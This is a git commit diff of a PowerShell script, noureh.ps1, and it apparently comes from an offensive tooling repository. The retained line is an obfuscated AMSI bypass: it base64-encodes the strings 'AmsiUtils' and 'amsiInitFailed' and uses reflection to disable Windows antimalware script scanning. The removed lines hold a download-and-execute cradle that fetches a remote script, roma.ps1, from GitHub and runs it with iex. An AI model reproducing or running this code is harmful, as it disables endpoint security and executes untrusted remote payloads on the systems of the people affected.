edef5511df6eb7abb77a4f5d3751902b7e4d2c41
W1kyri3 <81154240+W1kyri3@users.noreply.github.com>
2021-04-08 20:56:01 +0100

    Update noureh.ps1

--- noureh.ps1
+++ noureh.ps1
@@ -1,4 +1,1 @@
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
-
-iex(new-object net.webclient).downloadString('https://raw.githubusercontent.com/W1kyri3/lunai/main/roma.ps1')
-
